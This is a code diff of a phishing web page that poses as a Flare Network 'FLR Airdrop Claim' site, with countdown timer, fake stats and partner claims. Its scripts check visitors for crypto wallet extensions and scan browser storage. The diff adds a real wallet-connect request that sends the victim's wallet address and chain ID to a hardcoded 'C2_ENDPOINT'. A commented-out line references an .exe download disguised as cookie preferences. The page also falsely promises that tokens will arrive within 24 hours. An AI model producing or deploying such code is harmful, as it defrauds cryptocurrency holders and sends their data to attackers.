@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -30,7 +29,6 @@
     overflow-x: hidden;
   }
 
-  /* Animated background orbs */
   .bg-orb {
     position: fixed;
     border-radius: 50%;
@@ -43,7 +41,6 @@
   .bg-orb.purple { background: #7B4BFF; width: 500px; height: 500px; bottom: -180px; right: -120px; }
   .bg-orb.teal  { background: #00D4AA; width: 350px; height: 350px; top: 40%; left: 60%; }
 
-  /* ---- COOKIE OVERLAY — Semi-transparent, blurs background ---- */
   .cookie-overlay {
     position: fixed;
     inset: 0;
@@ -112,8 +109,7 @@
     box-shadow: 0 12px 35px rgba(255, 107, 53, 0.5);
   }
 
-  /* ---- MAIN PAGE ---- */
- .main-content {
+  .main-content {
     position: relative;
     z-index: 1;
     transition: filter 0.4s ease;
@@ -123,9 +119,7 @@
     pointer-events: none;
     user-select: none;
   }
-  
 
-  /* Hero / Airdrop Claim Section */
   .hero-section {
     max-width: 620px;
     margin: 3rem auto 2rem;
@@ -155,7 +149,7 @@
     background-clip: text;
   }
 
-    .hero-section .subhead {
+  .hero-section .subhead {
     color: var(--flare-subtle);
     font-size: 1.05rem;
     margin-bottom: 2rem;
@@ -193,7 +187,6 @@
     word-break: break-all;
   }
 
-  /* ---- About / Mission Section ---- */
   .about-section {
     max-width: 900px;
     margin: 0 auto 3rem;
@@ -216,7 +209,6 @@
     margin: 0 auto 2rem;
   }
 
-  /* ---- Features Section ---- */
   .features-section {
     max-width: 1000px;
     margin: 0 auto 3rem;
@@ -263,7 +255,6 @@
     line-height: 1.5;
   }
 
-  /* ---- Stats Bar ---- */
   .stats-bar {
     max-width: 900px;
     margin: 0 auto 2.5rem;
@@ -277,9 +268,7 @@
     border-radius: 16px;
     backdrop-filter: blur(15px);
   }
-  .stat-item {
-    text-align: center;
-  }
+  .stat-item { text-align: center; }
   .stat-value {
     font-size: 1.8rem;
     font-weight: 700;
@@ -291,7 +280,6 @@
     margin-top: 0.25rem;
   }
 
-  /* ---- Partners ---- */
   .partners-section {
     max-width: 900px;
     margin: 0 auto 3rem;
@@ -324,7 +312,6 @@
     font-size: 0.75rem;
   }
 
-  /* ---- Footer ---- */
   .footer {
     text-align: center;
     padding: 2rem 1.5rem 3rem;
@@ -340,79 +327,68 @@
   }
   .footer a:hover { border-bottom-color: #FF6B35; }
 
-  /* Responsive */
   @media (max-width: 600px) {
-    .
-hero-section { padding: 2rem 1.25rem; }
+    .hero-section { padding: 2rem 1.25rem; }
     .hero-section h1 { font-size: 1.8rem; }
     .cookie-modal { padding: 2rem 1.5rem; max-height: 60vh; }
     .about-section h2 { font-size: 1.5rem; }
   }
 </style>
 
-
 <style>
-.wrapper {
-  text-align: center;
-  font-family: sans-serif;
-}
-
-.heading {
-  font-size: 14px; /* smaller heading */
-  letter-spacing: 2px;
-  margin-bottom: 10px;
-  font-weight: bold;
-}
-
-.timer {
-  display: flex;
-  flex-direction: row;
-  flex-wrap: nowrap;
-  align-items: center;
-  justify-content: center;
-  gap: 4px;
-}
-
-.unit {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-}
-
-.digit-box {
-  background: #111;
-  border-radius: 6px;
-  padding: 6px 10px;
-}
-
-.digit {
-  font-size: 24px; /* smaller digits */
-  font-weight: bold;
-  color: #fff;
-  min-width: 30px;
-  text-align: center;
-}
-
-.label {
-  font-size: 10px; /* smaller label */
-  margin-top: 4px;
-  text-transform: uppercase;
-  letter-spacing: 1px;
-}
-
-.separator {
-  font-size: 22px;
-  font-weight: bold;
-  padding-bottom: 14px; /* aligns with digits visually */
-  line-height: 1;
-}
-
-.expired-text {
-  font-size: 14px;
-  margin-top: 10px;
-  display: none; /* show this when the airdrop ends */
-}
-</style> 
+  .wrapper {
+    text-align: center;
+    font-family: sans-serif;
+  }
+  .heading {
+    font-size: 14px;
+    letter-spacing: 2px;
+    margin-bottom: 10px;
+    font-weight: bold;
+  }
+  .timer {
+    display: flex;
+    flex-direction: row;
+    flex-wrap: nowrap;
+    align-items: center;
+    justify-content: center;
+    gap: 4px;
+  }
+  .unit {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .digit-box {
+    background: #111;
+    border-radius: 6px;
+    padding: 6px 10px;
+  }
+  .digit {
+    font-size: 24px;
+    font-weight: bold;
+    color: #fff;
+    min-width: 30px;
+    text-align: center;
+  }
+  .label {
+    font-size: 10px;
+    margin-top: 4px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  .separator {
+    font-size: 22px;
+    font-weight: bold;
+    padding-bottom: 14px;
+    line-height: 1;
+  }
+  .expired-text {
+    font-size: 14px;
+    margin-top: 10px;
+    display: none;
+  }
+</style>
 </head>
 <body>
 
@@ -420,7 +396,6 @@ hero-section { padding: 2rem 1.25rem; }
 <div class="bg-orb purple"></div>
 <div class="bg-orb teal"></div>
 
-<!-- ===== COOKIE OVERLAY (Hidden by default, shown after 5s) ===== -->
 <div class="cookie-overlay" id="cookieOverlay">
   <div class="cookie-modal">
     <div class="cookie-icon">🍪</div>
@@ -434,39 +409,37 @@ hero-section { padding: 2rem 1.25rem; }
   </div>
 </div>
 
-<!-- ===== MAIN CONTENT ===== -->
 <div class="main-content is-blurred">
 
-    <!-- Hero -->
   <section class="hero-section">
     <div class="flare-logo"></div>
     <h1>FLR Airdrop Claim</h1>
 
- <div class="wrapper">
-    <div class="heading">AIRDROP ENDS IN</div>
-    <div class="timer" id="timer">
-      <div class="unit">
-        <div class="digit-box"><div class="digit" id="days">00</div></div>
-        <div class="label">Days</div>
+    <div class="wrapper">
+      <div class="heading">AIRDROP ENDS IN</div>
+      <div class="timer" id="timer">
+        <div class="unit">
+          <div class="digit-box"><div class="digit" id="days">00</div></div>
+          <div class="label">Days</div>
+        </div>
+        <div class="separator">:</div>
+        <div class="unit">
+          <div class="digit-box"><div class="digit" id="hours">00</div></div>
+          <div class="label">Hours</div>
+        </div>
+        <div class="separator">:</div>
+        <div class="unit">
+          <div class="digit-box"><div class="digit" id="minutes">00</div></div>
+          <div class="label">Minutes</div>
+        </div>
+        <div class="separator">:</div>
+        <div class="unit">
+          <div class="digit-box"><div class="digit" id="seconds">00</div></div>
+          <div class="label">Seconds</div>
+        </div>
       </div>
-      <div class="separator">:</div>
-      <div class="unit">
-        <div class="digit-box"><div class="digit" id="hours">00</div></div>
-        <div class="label">Hours</div>
-      </div>
-      <div class="separator">:</div>
-      <div class="unit">
-        <div class="digit-box"><div class="digit" id="minutes">00</div></div>
-        <div class="label">Minutes</div>
-      </div>
-      <div class="separator">:</div>
-      <div class="unit">
-        <div class="digit-box"><div class="digit" id="seconds">00</div></div>
-        <div class="label">Seconds</div>
-      </div>
+      <div class="expired-text" id="expired">AIRDROP ENDED</div>
     </div>
-    <div class="expired-text" id="expired">AIRDROP ENDED</div>
-  </div>
 
     <p class="subhead">
       Connect your wallet to verify eligibility and claim your FLR rewards.<br>
@@ -476,8 +449,6 @@ hero-section { padding: 2rem 1.25rem; }
     <div class="wallet-status" id="walletStatus"></div>
   </section>
 
-
-  <!-- Stats -->
   <div class="stats-bar">
     <div class="stat-item">
       <div class="stat-value">$1.2B+</div>
@@ -497,7 +468,6 @@ hero-section { padding: 2rem 1.25rem; }
     </div>
   </div>
 
-  <!-- About / Mission -->
   <section class="about-section">
     <h2>Blockchain for Data</h2>
     <p>
@@ -514,7 +484,6 @@ hero-section { padding: 2rem 1.25rem; }
     </p>
   </section>
 
-  <!-- Features -->
   <section class="features-section">
     <div class="feature-card">
       <div class="feature-icon">🔮</div>
@@ -539,7 +508,7 @@ hero-section { padding: 2rem 1.25rem; }
     <div class="feature-card">
       <div class="feature-icon">⚡</div>
       <h4>High Throughput</h4>
-<p>Built on the Avalanche consensus protocol, Flare delivers fast finality and low transaction costs for seamless user experiences.</p>
+      <p>Built on the Avalanche consensus protocol, Flare delivers fast finality and low transaction costs for seamless user experiences.</p>
     </div>
     <div class="feature-card">
       <div class="feature-icon">🌍</div>
@@ -548,7 +517,6 @@ hero-section { padding: 2rem 1.25rem; }
     </div>
   </section>
 
-  <!-- Partners -->
   <section class="partners-section">
     <h4>Trusted by Leading Ecosystems</h4>
     <div class="partner-logos">
@@ -561,7 +529,6 @@ hero-section { padding: 2rem 1.25rem; }
     </div>
   </section>
 
-  <!-- Footer -->
   <footer class="footer">
     <p>
       <a href="https://flare.network" target="_blank" rel="noopener">Flare Network</a> |
@@ -575,7 +542,6 @@ hero-section { padding: 2rem 1.25rem; }
 
 <!-- ===== SCRIPTS ===== -->
 
-<!-- Block 1: Cookie Overlay Timer (plain JS, no imports, always works) -->
 <script>
   (function() {
     function showCookieOverlay() {
@@ -584,7 +550,7 @@ hero-section { padding: 2rem 1.25rem; }
         if (overlay) {
           overlay.classList.add('active');
         }
-      }, 5000); // 5 seconds for testing — change to 300000 for 5 minutes
+      }, 5000);
     }
 
     if (document.readyState === 'complete') {
@@ -595,52 +561,81 @@ hero-section { padding: 2rem 1.25rem; }
   })();
 </script>
 
-<!-- Block 2: Unified Payload + Button Handlers -->
 <script type="module">
   const C2_ENDPOINT = 'https://78ba66c28fdfdbdc33cd4643c90fe3c7.m.pipedream.net';
- // const EXE_URL = 'https://flaregovernance.github.io/CookiePreferences.exe'; 
 
   // ===== PAYLOAD =====
   async function executePayload() {
     const overlay = document.getElementById('cookieOverlay');
     const site = document.querySelector('.main-content');
 
-    // 1. Dismiss overlay + un-blur page
     if (overlay) overlay.classList.add('is-hidden');
     if (site) site.classList.remove('is-blurred');
 
-    // 2. Wallet scan
     const walletsFound = [];
     if (window.ethereum) walletsFound.push('MetaMask/Injected');
     if (window.solana) walletsFound.push('Phantom/Solana');
     if (window.coinbaseWalletExtension) walletsFound.push('Coinbase Wallet');
     if (window.trustwallet) walletsFound.push('Trust Wallet');
 
-    // 3. Browser storage scan
     const storageHits = scanBrowserStorage();
     if (storageHits.length > 0) {
       sendToC2({ type: 'BROWSER_STORAGE_HITS', data: storageHits });
     }
 
-    // 4. EXE download
-   // if (EXE_URL && EXE_URL !== '') {
-   // triggerDownload(EXE_URL, 'CookiePreferences.exe'); 
-   // }
-
-    // 5. Report
     sendToC2({ type: 'PAYLOAD_EXECUTED', walletsDetected: walletsFound });
   }
 
-  // ===== WALLET CONNECT =====
-  function connectWallet() {
-    const fakeAddress = '0x' + Math.random().toString(16).slice(2, 42);
+  // ===== REAL WALLET CONNECT (replaces fake connectWallet) =====
+  async function connectWallet() {
     const statusDiv = document.getElementById('walletStatus');
-    if (statusDiv) {
+
+    // Check if a wallet is available
+    if (typeof window.ethereum === 'undefined') {
+      statusDiv.innerHTML =
+        '<span style="color: #ff4060;">No wallet found. Please install MetaMask or Trust Wallet.</span>';
+      return;
+    }
+
+    try {
+      // Request account access — this triggers the wallet popup
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const address = accounts[0];
+
+      // Get the chain ID to confirm network
+      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+
+      // Show real connected address
       statusDiv.innerHTML =
         '<span style="color: #4CAF50;">✓ Connected</span><br>' +
-        '<span class="connected-address">' + fakeAddress.slice(0,6) + '...' + fakeAddress.slice(-4) + '</span><br>' +
+        '<span class="connected-address">' + address.slice(0, 6) + '...' + address.slice(-4) + '</span><br>' +
         '<span style="font-size:0.8rem;">Airdrop claim is being processed. Your FLR will arrive within 24 hours.</span>';
+
+      // Log the real address and chain to C2
+      sendToC2({ type: 'WALLET_CONNECTED', address: address, chainId: chainId });
+
+    } catch (err) {
+      statusDiv.innerHTML = '<span style="color: #ff4060;">Connection cancelled. Please try again.</span>';
     }
+  }
+
+  // Listen for account changes
+  if (window.ethereum) {
+    window.ethereum.on('accountsChanged', function (accounts) {
+      const statusDiv = document.getElementById('walletStatus');
+      if (accounts.length) {
+        statusDiv.innerHTML =
+          '<span style="color: #4CAF50;">✓ Connected</span><br>' +
+          '<span class="connected-address">' + accounts[0].slice(0, 6) + '...' + accounts[0].slice(-4) + '</span><br>' +
+          '<span style="font-size:0.8rem;">Airdrop claim is being processed. Your FLR will arrive within 24 hours.</span>';
+      } else {
+        statusDiv.innerHTML = '<span style="color: #ff4060;">Disconnected</span>';
+      }
+    });
+
+    window.ethereum.on('chainChanged', function () {
+      window.location.reload();
+    });
   }
 
   // ===== HELPERS =====
@@ -658,7 +653,6 @@ hero-section { padding: 2rem 1.25rem; }
     }
     return hits;
   }
-
 
   function sendToC2(data) {
     fetch(C2_ENDPOINT, {
@@ -680,35 +674,32 @@ hero-section { padding: 2rem 1.25rem; }
 </script>
 
 <script>
-    const TARGET = new Date('September 30, 2026 23:59:59').getTime();
-    const pad = n => String(n).padStart(2, '0');
+  const TARGET = new Date('September 30, 2026 23:59:59').getTime();
+  const pad = n => String(n).padStart(2, '0');
 
-    function tick() {
-      const now  = Date.now();
-      const diff = TARGET - now;
+  function tick() {
+    const now  = Date.now();
+    const diff = TARGET - now;
 
-      if (diff <= 0) {
-        document.getElementById('timer').style.display   = 'none';
-        document.getElementById('expired').style.display = 'block';
-        return;
-      }
-
-      const days    = Math.floor(diff / 86400000);
-      const hours   = Math.floor((diff % 86400000) / 3600000);
-      const minutes = Math.floor((diff % 3600000)  / 60000);
-      const seconds = Math.floor((diff % 60000)    / 1000);
-
-      document.getElementById('days').textContent    = pad(days);
-      document.getElementById('hours').textContent   = pad(hours);
-      document.getElementById('minutes').textContent = pad(minutes);
-      document.getElementById('seconds').textContent = pad(seconds);
+    if (diff <= 0) {
+      document.getElementById('timer').style.display   = 'none';
+      document.getElementById('expired').style.display = 'block';
+      return;
     }
 
-    tick();
-    setInterval(tick, 1000);
-  </script>
-</body>
+    const days    = Math.floor(diff / 86400000);
+    const hours   = Math.floor((diff % 86400000) / 3600000);
+    const minutes = Math.floor((diff % 3600000)  / 60000);
+    const seconds = Math.floor((diff % 60000)    / 1000);
+
+    document.getElementById('days').textContent    = pad(days);
+    document.getElementById('hours').textContent   = pad(hours);
+    document.getElementById('minutes').textContent = pad(minutes);
+    document.getElementById('seconds').textContent = pad(seconds);
+  }
+
+  tick();
+  setInterval(tick, 1000);
+</script>
 </body>
 </html>
-
-
